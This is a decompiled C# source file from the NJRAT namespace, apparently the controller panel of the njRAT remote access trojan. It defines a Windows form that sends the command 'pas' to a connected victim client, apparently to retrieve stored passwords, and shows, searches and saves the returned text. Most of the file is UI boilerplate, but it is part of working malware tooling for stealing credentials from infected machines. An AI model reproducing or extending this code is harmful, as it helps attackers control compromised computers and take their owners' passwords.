using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000020 RID: 32
	[DesignerGenerated]
	public partial class pas : Form
	{
		// Token: 0x06000451 RID: 1105 RVA: 0x0016CFC8 File Offset: 0x0016B3C8
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = pas.__ENCList;
			lock (_ENCList)
			{
				bool flag = pas.__ENCList.Count == pas.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = pas.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = pas.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								pas.__ENCList[num] = pas.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					pas.__ENCList.RemoveRange(num, pas.__ENCList.Count - num);
					pas.__ENCList.Capacity = pas.__ENCList.Count;
				}
				pas.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700018C RID: 396
		// (get) Token: 0x06000454 RID: 1108 RVA: 0x0016D6E0 File Offset: 0x0016BAE0
		// (set) Token: 0x06000455 RID: 1109 RVA: 0x0016D6F8 File Offset: 0x0016BAF8
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x1700018D RID: 397
		// (get) Token: 0x06000456 RID: 1110 RVA: 0x0016D704 File Offset: 0x0016BB04
		// (set) Token: 0x06000457 RID: 1111 RVA: 0x0016D71C File Offset: 0x0016BB1C
		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MenuStrip1 = value;
			}
		}

		// Token: 0x1700018E RID: 398
		// (get) Token: 0x06000458 RID: 1112 RVA: 0x0016D728 File Offset: 0x0016BB28
		// (set) Token: 0x06000459 RID: 1113 RVA: 0x0016D740 File Offset: 0x0016BB40
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= eventHandler;
				}
				this._ToolStripMenuItem1 = value;
				flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700018F RID: 399
		// (get) Token: 0x0600045A RID: 1114 RVA: 0x0016D7A0 File Offset: 0x0016BBA0
		// (set) Token: 0x0600045B RID: 1115 RVA: 0x0016D7B8 File Offset: 0x0016BBB8
		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem2_Click);
				bool flag = this._ToolStripMenuItem2 != null;
				if (flag)
				{
					this._ToolStripMenuItem2.Click -= eventHandler;
				}
				this._ToolStripMenuItem2 = value;
				flag = this._ToolStripMenuItem2 != null;
				if (flag)
				{
					this._ToolStripMenuItem2.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000190 RID: 400
		// (get) Token: 0x0600045C RID: 1116 RVA: 0x0016D818 File Offset: 0x0016BC18
		// (set) Token: 0x0600045D RID: 1117 RVA: 0x0016D830 File Offset: 0x0016BC30
		internal virtual ToolStripTextBox TFind
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TFind;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TFind = value;
			}
		}

		// Token: 0x17000191 RID: 401
		// (get) Token: 0x0600045E RID: 1118 RVA: 0x0016D83C File Offset: 0x0016BC3C
		// (set) Token: 0x0600045F RID: 1119 RVA: 0x0016D854 File Offset: 0x0016BC54
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x17000192 RID: 402
		// (get) Token: 0x06000460 RID: 1120 RVA: 0x0016D860 File Offset: 0x0016BC60
		// (set) Token: 0x06000461 RID: 1121 RVA: 0x0016D878 File Offset: 0x0016BC78
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x17000193 RID: 403
		// (get) Token: 0x06000462 RID: 1122 RVA: 0x0016D884 File Offset: 0x0016BC84
		// (set) Token: 0x06000463 RID: 1123 RVA: 0x0016D89C File Offset: 0x0016BC9C
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CopyToolStripMenuItem_Click);
				bool flag = this._CopyToolStripMenuItem != null;
				if (flag)
				{
					this._CopyToolStripMenuItem.Click -= eventHandler;
				}
				this._CopyToolStripMenuItem = value;
				flag = this._CopyToolStripMenuItem != null;
				if (flag)
				{
					this._CopyToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000194 RID: 404
		// (get) Token: 0x06000464 RID: 1124 RVA: 0x0016D8FC File Offset: 0x0016BCFC
		// (set) Token: 0x06000465 RID: 1125 RVA: 0x0016D914 File Offset: 0x0016BD14
		internal virtual ToolStripMenuItem SelectAllToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SelectAllToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.SelectAllToolStripMenuItem_Click);
				bool flag = this._SelectAllToolStripMenuItem != null;
				if (flag)
				{
					this._SelectAllToolStripMenuItem.Click -= eventHandler;
				}
				this._SelectAllToolStripMenuItem = value;
				flag = this._SelectAllToolStripMenuItem != null;
				if (flag)
				{
					this._SelectAllToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000195 RID: 405
		// (get) Token: 0x06000466 RID: 1126 RVA: 0x0016D974 File Offset: 0x0016BD74
		// (set) Token: 0x06000467 RID: 1127 RVA: 0x0016D98C File Offset: 0x0016BD8C
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				bool flag = this._SaveAsToolStripMenuItem != null;
				if (flag)
				{
					this._SaveAsToolStripMenuItem.Click -= eventHandler;
				}
				this._SaveAsToolStripMenuItem = value;
				flag = this._SaveAsToolStripMenuItem != null;
				if (flag)
				{
					this._SaveAsToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x06000468 RID: 1128 RVA: 0x0016D9EC File Offset: 0x0016BDEC
		public pas()
		{
			pas.__ENCAddToList(this);
			this.listViewItem_0 = null;
			this.InitializeComponent();
		}

		// Token: 0x06000469 RID: 1129 RVA: 0x0016DA0C File Offset: 0x0016BE0C
		public void insert(string T)
		{
			bool flag = T.StartsWith("\u0001") & T.EndsWith("\u0001");
			if (flag)
			{
				this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
				this.T1.SelectionColor = Color.Green;
				this.T1.AppendText("\r\n[ " + T.Replace("\u0001", string.Empty) + "]\r\n");
			}
			else
			{
				this.T1.SelectionFont = this.T1.Font;
				this.T1.SelectionColor = this.T1.ForeColor;
				this.T1.AppendText(T + "\r\n");
			}
		}

		// Token: 0x0600046A RID: 1130 RVA: 0x0016DAD8 File Offset: 0x0016BED8
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.Copy();
		}

		// Token: 0x0600046B RID: 1131 RVA: 0x0016DAE8 File Offset: 0x0016BEE8
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				this.c.Send("pas");
				this.ToolStripMenuItem1.Enabled = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600046C RID: 1132 RVA: 0x0016DB38 File Offset: 0x0016BF38
		private void SelectAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.SelectAll();
		}

		// Token: 0x0600046D RID: 1133 RVA: 0x0016DB48 File Offset: 0x0016BF48
		private void ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.T1.Find(this.TFind.Text, this.T1.SelectionStart + this.T1.SelectionLength, RichTextBoxFinds.None) == -1;
			if (flag)
			{
				this.T1.Find(this.TFind.Text, 0, RichTextBoxFinds.None);
			}
		}

		// Token: 0x0600046E RID: 1134 RVA: 0x0016DBA8 File Offset: 0x0016BFA8
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog
			{
				Filter = "(*.rtf)|*.rtf"
			};
			bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.T1.SaveFile(saveFileDialog.FileName);
			}
		}

		// Token: 0x04000202 RID: 514
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000204 RID: 516
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x04000205 RID: 517
		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		// Token: 0x04000206 RID: 518
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x04000207 RID: 519
		[AccessedThroughProperty("ToolStripMenuItem2")]
		private ToolStripMenuItem _ToolStripMenuItem2;

		// Token: 0x04000208 RID: 520
		[AccessedThroughProperty("TFind")]
		private ToolStripTextBox _TFind;

		// Token: 0x04000209 RID: 521
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x0400020A RID: 522
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x0400020B RID: 523
		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem _CopyToolStripMenuItem;

		// Token: 0x0400020C RID: 524
		[AccessedThroughProperty("SelectAllToolStripMenuItem")]
		private ToolStripMenuItem _SelectAllToolStripMenuItem;

		// Token: 0x0400020D RID: 525
		[AccessedThroughProperty("SaveAsToolStripMenuItem")]
		private ToolStripMenuItem _SaveAsToolStripMenuItem;

		// Token: 0x0400020E RID: 526
		public Client c;

		// Token: 0x0400020F RID: 527
		private ListViewItem listViewItem_0;
	}
}
